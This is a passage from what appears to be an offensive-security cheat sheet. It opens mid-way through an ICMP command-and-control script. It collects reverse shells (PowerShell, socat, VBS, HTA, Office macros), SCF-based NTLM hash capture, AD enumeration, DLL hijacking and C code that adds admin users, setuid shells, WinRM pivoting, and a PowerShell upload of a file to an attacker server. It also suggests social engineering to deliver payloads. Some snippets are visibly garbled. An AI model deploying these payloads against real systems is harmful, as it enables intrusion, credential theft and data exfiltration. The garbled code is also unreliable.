DOWNLOAD_filename = fullpath.split('\\')[-1]

download_buffer = ""

if cmd[0:6] == 'UPLOAD':

(upload, local_path, remote_path) = shlex.split(cmd.strip(), posix=False)

httpupload(UID, local_path, remote_path, powershell=False)

cmd = "get-filehash -algorithm md5 '"+remote_path+"' | fl; $(CertUtil -hashfile '"+remote_path+"' MD5)[1] -replace ' ',''"

icmp.set_icmp_id(ident)

icmp.set_icmp_seq(seq_id)

if cmd and cmd[:8] != UID:

cmd = UID+cmd

icmp.contains(ImpactPacket.Data(cmd))

icmp.set_icmp_cksum(0)

icmp.auto_checksum = 1

ip.contains(icmp)

sock.sendto(ip.get_packet(), (dst, 0))

# Set /proc/sys/net/ipv4/icmp_echo_ignore_all = 1

with open("/proc/sys/net/ipv4/icmp_echo_ignore_all", 'wt') as f:

f.write("1")

try:

th1 = threading.Thread(target=send_payload, args = (INITIAL_UID,))

th1.daemon = True

th1.start()

sys.exit(main(LHOST, RHOST, INITIAL_UID))

except (KeyboardInterrupt, SystemExit):

th1.join()

except Exception as e:

print(str(e))
```

#### .SCF Reverse Shells

SCF files are Windows Shell Command files that can be used to create references to icon files.

```
[Shell] 
Command=2 
IconFile=<icon file> 
[<what you want to control>] 
Command=<command>
```

SCF Files can be created and used to capture credentials in vulnerable version of the SMB protocol in Windows systems. This can be done by configuring the `IconFile` to reference or point to an icon file on the attacker machine. The icon file can be fake and non-existent as well. Example is below

```
[Shell]  
Command=2  
IconFile=\\attacker-ip\share\file.ico  
[Taskbar]  
Command=ToggleDesktop
```

The above can be saved into .scf file and uploaded into the web application. If the uploaded .scf file gets browsed to with explorer.exe of the target system. This is because the .scf file is uploaded into `a file share that exists on the SMB server of the target machine which is the only case this method would work`. Before uploading we run a listener using Responder to catch the authentication request from the target SMB server

```
sudo Responder -I eth0
```

Then the file can be uploaded and you should receive the NTLMV2 hash in the responder output if successful.

### Enumeration

#### Python Port Scanner

```
import socket as sk
for port in range (1, 1024):
	try:
		s=sk.socket(sk.AF_INET, sk.SOCK_STREAM)
		s.settimeout(1000)
		s.connect (('ip',port))
		print '%d:OPEN' % (port)
		s.close
	except: continue
```

#### DNS Reverse Lookup Script

```
for ip in {1 .. 254 .. 1}; do dig -x l.l.l.$ip I grep $ip dns.txt; done;
```

#### Powershell Script for AD User Enumeration

```
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = ($domainObj.PdcRoleOwner).Name
$SearchString = "LDAP://"
$SearchString += $PDC + "/"
$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
$SearchString += $DistinguishedName
$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
$objDomain = New-Object System.DirectoryServices.DirectoryEntry
$Searcher.SearchRoot = $objDomain
$Searcher.filter="samAccountType=805306368"
$Searcher.FindAll()
```

#### Powershell Script for Enumerating Specific AD User Accounts

```
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = ($domainObj.PdcRoleOwner).Name
$SearchString = "LDAP://"
$SearchString += $PDC + "/"
$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
$SearchString += $DistinguishedName
$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
$objDomain = New-Object System.DirectoryServices.DirectoryEntry
$Searcher.SearchRoot = $objDomain
$Searcher.filter="name=[account-name]"
$Searcher.FindAll()
Foreach($obj in $Result)
{
Foreach($prop in $obj.Properties)
{
$prop
}
Write-Host "------------------------"
}
```

#### Powershell Script for Enumerating AD Groups

```
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = ($domainObj.PdcRoleOwner).Name
$SearchString = "LDAP://"
$SearchString += $PDC + "/"
$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
$SearchString += $DistinguishedName
$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
$objDomain = New-Object System.DirectoryServices.DirectoryEntry
$Searcher.SearchRoot = $objDomain
$Searcher.filter="(objectClass=Group)"
$Result = $Searcher.FindAll()
Foreach($obj in $Result)
{
$obj.Properties.name
}
Enumerating specific group and its members
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = ($domainObj.PdcRoleOwner).Name
$SearchString = "LDAP://"
$SearchString += $PDC + "/"
$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
$SearchString += $DistinguishedName
$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
$objDomain = New-Object System.DirectoryServices.DirectoryEntry
$Searcher.SearchRoot = $objDomain
$Searcher.filter="(name=[group-name])"
$Result = $Searcher.FindAll()
Foreach($obj in $Result)
{
$obj.Properties.member
}
```

#### Powershell Script for Enumerating service principal names to figure out the running services on the domain controller. In the example below, we enumerate for ‘http’.

```powershell
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = ($domainObj.PdcRoleOwner).Name
$SearchString = "LDAP://"
$SearchString += $PDC + "/"
$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
$SearchString += $DistinguishedName
$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
$objDomain = New-Object System.DirectoryServices.DirectoryEntry
$Searcher.SearchRoot = $objDomain
$Searcher.filter="serviceprincipalname=*http*"
$Result = $Searcher.FindAll()
Foreach($obj in $Result)
{
Foreach($prop in $obj.Properties)
{
$prop
}
}
```

#### Bash code to check ports running using http

The below script is useful when you want to discover services' ports running using \[http]

```bash
for i in {0..65535}; do 
	response=$(curl -s http://10.10.10.55:{i}; 
	len=$(echo $response | wc -w); 
	if [ "$len" -gt "0" ]; then 
	echo -n "${i}: "; 
	echo $response | tr -d "\r" | head -1 | cut -c-100; 
	fi; 
done
```

#### Visual Basic Reverse Shells

Create a new file named `shell.vbs` and paste the below content

```
Set shell = WScript.CreateObject("Wscript.Shell")
shell.Run("C:\Windows\System32\calc.exe " & WScript.ScriptFullName),0,True
```

And then execute below on the target

```
wscript shell.vbs
```

You could also name file `shell.vbs.txt` and then execute on the target as bellow

```
wscript /e:VBScript shell.vbs.txt
```

#### HTA Reverse Shell

HTA stands for HTML application which is an HTML that executes whatever you want. You could manually create an `.hta` payload by using `ActiveXobject` but for simplicity you can use exploitation frameworks.

**With Msfvenom**

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ip LPORT=port -f hta-psh -o shell.hta
```

Execute on the target and you will receive a shell

**With Metasploit**

```
msf6 > use exploit/windows/misc/hta_server
```

and then set the `LHOST` and `SRVHOST` to be the same

```
msf6 exploit(windows/misc/hta_server) > set LHOST 10.8.232.37 LHOST => 10.8.232.37 

msf6 exploit(windows/misc/hta_server) > set LPORT 443 LPORT => 443 

msf6 exploit(windows/misc/hta_server) > set SRVHOST 10.8.232.37 SRVHOST => 10.8.232.37 

msf6 exploit(windows/misc/hta_server) > set payload windows/meterpreter/reverse_tcp payload => windows/meterpreter/reverse_tcp 

msf6 exploit(windows/misc/hta_server) > exploit 

[*] Exploit running as background job 0. 

[*] Exploit completed, but no session was created. 

msf6 exploit(windows/misc/hta_server) > 

[*] Started reverse TCP handler on 10.8.232.37:443 

[*] Using URL: http://10.8.232.37:8080/TkWV9zkd.hta [*] Server started.
```

Copy the URL above and open it on the target or deliver it using some sort of social engineering.

#### Microsoft Office Macros

We can deliver payloads that return reverse shells using Macros in MS office. To start, create a new blank Microsoft document to create your first macro.

First, we need to open the Visual Basic Editor by selecting `view` → `macros`. The Macros window shows to create our own macro within the document.

In the Macro name section, choose to name your macro as `test`. Note that we need to select from the Macros in list `Document1` and finally select `create`. Next, the Microsoft Visual Basic for Application editor shows where we can write your code.

It is important that when you finished, you need to save it in `Macro-Enabled format` such as `.doc` and `docm`.

**With Powershell**

Copy the below into the macro code area. Don't forget to change the connection parameters and open a listener in your machine

```powershell
#Open a socket connection
$client = New-Object
System.Net.Sockets.TCPClient("IP",PORT);

$stream = $client.GetStream();

#Send shell prompt
$greeting = "PS " + (pwd).Path + "> "

$sendbyte = ([text.encoding]::ASCII).GetBytes($greeting)
$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush();

[byte[]]$bytes = 0..255|%{0};

#Wait for response, execute whatever’s coming, then loop back
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){

$data = (New-Object -TypeName
System.Text.ASCIIEncoding).GetString($bytes,0, $i);

$sendback = (iex $data 2>&1 | Out-String );

$sendback2 = $sendback + "PS " + (pwd).Path +
"> ";

$sendbyte =
([text.encoding]::ASCII).GetBytes($sendback2);
$stream.Write($sendbyte,0,$sendbyte.Length);
$stream.Flush()
};

$client.Close()
```

**With Visual Basic**

**With Msfvenom and Metasploit**

We can first generate a `vba` payload with msfvenom

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=ip LPORT=port -f vba
```

**Import to note** that one modification needs to be done to make this work.  The output will be working on an MS excel sheet. Therefore, change the `Workbook_Open()` to `Document_Open()` to make it suitable for MS word documents.

Now copy the output of the above command and save it into the macro editor of the MS word document.

Don't forget to run the listener on your machine.

```
msf5 > use exploit/multi/handler 

[*] Using configured payload generic/shell_reverse_tcp 

msf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp payload => windows/meterpreter/reverse_tcp 

msf5 exploit(multi/handler) > set LHOST 10.50.159.15 LHOST => 10.50.159.15 

msf5 exploit(multi/handler) > set LPORT 443 LPORT => 443 

msf5 exploit(multi/handler) > exploit
```

**Manual Macro**

The below code can be copied into the macro editor and saved in the MS document. Be sure to change the payload to equal the reverse shell you want to execute.

```excel
Sub PoC()
	Dim payload As String
	payload = "path-to-exe"
	CreateObject("Wscript.Shell").Run payload,0
End Sub

Sub Document_Open()
  PoC
End Sub

Sub AutoOpen()
  PoC
End Sub
```

### Privilege Escalation

#### perl one liner for privilege escalation

```
root@kali$:sudo perl -e 'exec' "/bin/bash";'
```

#### C code to perform DLL Hijacking

The below code can be used to perform DLL hijacking and create a new admin user. Change the values in the code according to your needs.

```C
#include <windows.h>

BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {

	if (dwReason == DLL_PROCESS_ATTACH) {
		system("cmd.exe /k net user admin newpass");
		ExitProcess(0);
	}
	return TRUE;
}
```

The above code changes the admin password to \[newpass] Compile the code with the below command on linux

```
x86_64-w64-mingw32-gcc code.c -shared -o code.dll
```

Replace \[code.dll] with the targeted or missing dll on the target machine then stop and start its associated service to execute your dll.

#### C Code \[2]

\[2-1]

```C
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
int main (void) {
	setuid(0);
	setgid(0);
	system("/bin/bash -p");
	return 0;
}
```

\[2-2]

```C
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
int main(void)
{
	setuid(geteuid());
	execl("/bin/sh","sh",0);
}
```

\[2-3] Adding a new admin user to the compromised windows system. Replace this code with an executable file with weak permissions and is run as a service or as an admin.

```C
#include <stdlib.h>
int main ()
{
int i;
i = system ("net user evil Ev!lpass /add");
i = system ("net localgroup administrators evil /add");
return 0;
}
```

### Links to webshells

https://github.com/backdoorhub/shell-backdoor-list/blob/master/shell/php/b374k.php

### Socat Shells

#### Linux

Listener \[1]

```
socat TCP-L:<port> -
```

\[2]

```
socat TCP-L:<PORT> EXEC:"bash -li"
```

Connect

```
socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"
```

Stable Listener

```
socat TCP-L:<port> FILE:`tty`,raw,echo=0
```

Stable Connect

```
socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane
```

#### Windows

Connect

```
socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes
```

Listen \[1]

```
socat TCP-L:<PORT> EXEC:powershell.exe,pipes
```

\[2]

```
socat TCP-L:<port> -
```

### Socat Encrypted

This command creates a 2048 bit RSA key with matching cert file, self-signed, and valid for just under a year. When you run this command it will ask you to fill in information about the certificate

```
openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt
```

merge the two created files into a single `.pem` file

```
cat shell.key shell.crt > shell.pem
```

Listener

```
socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -
```

Connect

```
socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash
```

### Pivoting

#### Ruby reverse shell using Winrm for pivoting

The below script is useful if you want to pivot to a machine on which the winrm port is open \[5985] Author \[Alamot]. You need to username and pass required to log in to the pivoted machine usually windows. Substitute IP:PORT with ip and port information of the machine that will be used to forward the connection to the pivoted machine.

```
require 'winrm-fs'

# Author: Alamot

# To upload a file type: UPLOAD local_path remote_path

# e.g.: PS> UPLOAD myfile.txt C:\temp\myfile.txt

conn = WinRM::Connection.new(

endpoint: 'https://IP:PORT/wsman',

transport: :ssl,

user: 'username',

password: 'password',

:no_ssl_peer_verification => true

)

file_manager = WinRM::FS::FileManager.new(conn)

class String

def tokenize

self.

split(/\s(?=(?:[^'"]|'[^']*'|"[^"]*")*$)/).

select {|s| not s.empty? }.

map {|s| s.gsub(/(^ +)|( +$)|(^["']+)|(["']+$)/,'')}

end

end

command=""

conn.shell(:powershell) do |shell|

until command == "exit\n" do

output = shell.run("-join($id,'PS ',$(whoami),'@',$env:computername,' ',$((gi $pwd).Name),'> ')")

print(output.output.chomp)

command = gets

if command.start_with?('UPLOAD') then

upload_command = command.tokenize

print("Uploading " + upload_command[1] + " to " + upload_command[2])

file_manager.upload(upload_command[1], upload_command[2]) do |bytes_copied, total_bytes, local_path, remote_path|

puts("#{bytes_copied} bytes of #{total_bytes} bytes copied")

end

command = "echo `nOK`n"

end

output = shell.run(command) do |stdout, stderr|

STDOUT.print(stdout)

STDERR.print(stderr)

end

end

puts("Exiting with code #{output.exitcode}")

end
```

The below script is useful if you want to execute a powershell reverse shell that returns shell on a different pivoted machine. You need to username and pass required to log in to the pivoted machine \[the first pivoted one] usually windows. Substitute IP:PORT with ip and port information of the machine that will be used to forward the connection to the pivoted machine. In the script, startin from \[conn.shell] you need username and password of the \[next pivoted machine] from which you will return a reverse shell using powershell. Substitute the username and password after \[conn.shell] part and also substitute computername and domain name as this works on in a domain joined machine.

```
require 'winrm'

conn = WinRM::Connection.new( 
  endpoint: 'https://ip:port/wsman',
  transport: :ssl,
  user: 'username',
  password: 'pass',
  :no_ssl_peer_verification => true
)

conn.shell(:powershell) do |shell|
  output = shell.run("$pass = convertto-securestring -AsPlainText -Force -String 'pass'; $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist 'test.local\\username',$pass; Invoke-Command -ComputerName machine.test.local -Credential $cred -Port 5985 -ScriptBlock {$client = New-Object System.Net.Sockets.TCPClient('your-ip',port); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {; $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); $sendback = (iex $data 2>&1 | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush()}; $client.Close(); }") do |stdout, stderr|
    STDOUT.print stdout
    STDERR.print stderr
  end
  puts "The script exited with exit code #{output.exitcode}"
end
```

### Data Exfiltration

**Exfiltration to a Webserver with PowerShell** The below command will send the `master.zip` file to a webserver hosted by the attacker. Make sure to change the parameters to fit your environment.

```
powershell.exe -noprofile -noninteractive -command "[System.Net.ServicePointManager] ::ServerCertificateValidationCallback
{$true); $server="""http://ATTACKER-IP/upload-path""";$filepath="""C:\rnaster.zip""";$http= new=object System.Net.WebClient;
$response=$http.UploadFile($server,$filepath);"
```
